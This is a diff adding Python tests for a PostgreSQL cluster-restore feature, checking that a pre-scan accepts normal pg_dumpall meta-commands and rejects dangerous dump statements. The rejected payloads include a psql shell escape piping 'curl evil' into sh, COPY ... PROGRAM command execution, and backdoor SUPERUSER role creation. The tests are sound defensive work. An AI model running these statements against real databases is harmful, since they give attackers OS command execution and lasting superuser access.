@@ -327,6 +327,77 @@ def test_restore_overwrite_drops_objects_then_loads(restore_job_env):
     assert project.exists()
 
 
+REAL_DUMP_META = (
+    b"--\n-- PostgreSQL database cluster dump\n--\n"
+    rb"\restrict abc123" + b"\n"
+    + b"SET default_transaction_read_only = off;\n"
+    + b"CREATE ROLE appuser;\n"
+    + b"ALTER ROLE pgadmin WITH SUPERUSER INHERIT CREATEROLE CREATEDB LOGIN PASSWORD 'x';\n"
+    + rb"\unrestrict abc123" + b"\n"
+    + rb"\connect template1" + b"\n"
+    + b"CREATE DATABASE appdb WITH TEMPLATE = template0 ENCODING = 'UTF8';\n"
+    + rb"\connect appdb" + b"\n"
+)
+
+
+def test_prescan_accepts_real_dumpall_meta_commands(restore_job_env):
+    r"""Real pg_dumpall output contains \restrict/\unrestrict/\connect lines;
+    the pre-scan must not reject them or every legit restore fails."""
+    settings, runner, db, psql, store = restore_job_env
+    import gzip
+
+    upload_id = _complete_upload(store, gzip.compress(REAL_DUMP_META))
+    runner.on("d.datname FROM pg_database", stdout="")
+    runner.on("r.rolname FROM pg_roles", stdout="")
+    runner.on("ORDER BY 1", stdout="")
+    runner.on("pg_roles", stdout="pgadmin\n")
+    runner.set_pipe_through(lines=[], returncode=0)
+
+    result = restore_cluster(
+        _ctx(db),
+        settings=settings,
+        psql=psql,
+        runner=runner,
+        db=db,
+        upload_id=upload_id,
+    )
+    assert result["error_count"] == 0
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        rb"\! /bin/sh -c 'curl evil | sh'",
+        b"COPY public.t FROM PROGRAM 'curl evil';",
+        b"COPY (SELECT 1) TO PROGRAM 'bash -c id';",
+        b"CREATE ROLE backdoor SUPERUSER LOGIN PASSWORD 'x';",
+        b"ALTER ROLE appuser WITH SUPERUSER;",
+    ],
+)
+def test_prescan_rejects_dangerous_statements(restore_job_env, payload):
+    """A restored dump executes as the postgres superuser: psql meta-commands
+    and COPY PROGRAM are OS command execution; SUPERUSER grants persist after
+    the restore. Reject before loading."""
+    settings, runner, db, psql, store = restore_job_env
+    import gzip
+
+    dump = (
+        b"--\n-- PostgreSQL database cluster dump\n--\n" + payload + b"\n"
+    )
+    upload_id = _complete_upload(store, gzip.compress(dump))
+
+    with pytest.raises(Exception, match="forbidden"):
+        restore_cluster(
+            _ctx(db),
+            settings=settings,
+            psql=psql,
+            runner=runner,
+            db=db,
+            upload_id=upload_id,
+        )
+    assert runner.pipe_through_calls == []
+
+
 def test_wrong_confirm_returns_400(settings):
     settings.stack_dir.mkdir(parents=True)
     settings.stack_env_path.write_text("POSTGRES_USER=pgadmin\n")
